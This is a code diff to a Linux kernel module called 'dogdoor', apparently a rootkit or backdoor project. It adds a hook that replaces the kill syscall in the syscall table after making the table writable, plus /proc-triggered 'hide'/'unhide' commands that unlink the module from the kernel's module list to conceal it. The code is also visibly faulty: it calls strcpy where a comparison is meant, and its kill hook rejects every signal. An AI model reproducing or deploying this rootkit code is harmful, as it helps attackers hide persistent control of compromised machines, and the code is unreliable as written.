@@ -11,12 +11,16 @@
 
 MODULE_LICENSE("GPL");
 
+static struct list_head *new = &(THIS_MODULE->list);
+static struct list_head *head;
 char filepath[128] = { 0x0, } ;
 unsigned int userID = 1;
 unsigned int processID = 1;
 char Hide[32] = { 0x0, };
 void ** sctable ;
 int count = 0 ;
+int hide =0;
+int unhide =0;
 char of0[256];
 char of1[256];
 char of2[256];
@@ -28,6 +32,18 @@ char of7[256];
 char of8[256];
 char of9[256];
 char *listOF[10] = {of0, of2, of3, of4, of5, of6,of7,of8, of9};
+
+asmlinkage int (*orig_sys_kill)(pid_t pid, int sig) ;
+
+asmlinkage int openhook_sys_kill(pid_t pid, int sig)
+{
+        pid_t pId=0;
+
+        copy_from_user(&pId, &pid, sizeof(pid_t));
+                return -1 ;
+        
+        return orig_sys_kill(pid, sig);
+}
 
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
 
@@ -102,6 +118,16 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
         if (buf[0] == 'h') {
                 sscanf(buf+sizeof(char), "%c", Hide);
         }
+        
+        if(hide==0&&strcpy(buf,"hide")==0){
+                 list_del(new);
+                  hide = 1;
+        }
+        if(hide==1 && strcpy(buf,"unhide")==0){
+                list_add(new, head);
+                hide = 0;
+        }
+
         *offset = strlen(buf) ;
 
         return *offset ;
@@ -126,10 +152,12 @@ int __init dogdoor_init(void) {
         sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
 
         orig_sys_open = sctable[__NR_open] ;
+        orig_sys_kill = sctable[__NR_kill] ;
         pte = lookup_address((unsigned long) sctable, &level) ;
         if (pte->pte &~ _PAGE_RW) 
                 pte->pte |= _PAGE_RW ;          
         sctable[__NR_open] = dogdoor_sys_open ;
+        sctable[__NR_kill] = openhook_sys_kill ;
 
         return 0;
 }
@@ -141,6 +169,7 @@ void __exit dogdoor_exit(void) {
         remove_proc_entry("dogdoor", NULL) ;
 
         sctable[__NR_open] = orig_sys_open ;
+        sctable[__NR_kill] = orig_sys_kill ;
         pte = lookup_address((unsigned long) sctable, &level) ;
         pte->pte = pte->pte &~ _PAGE_RW ;
 }
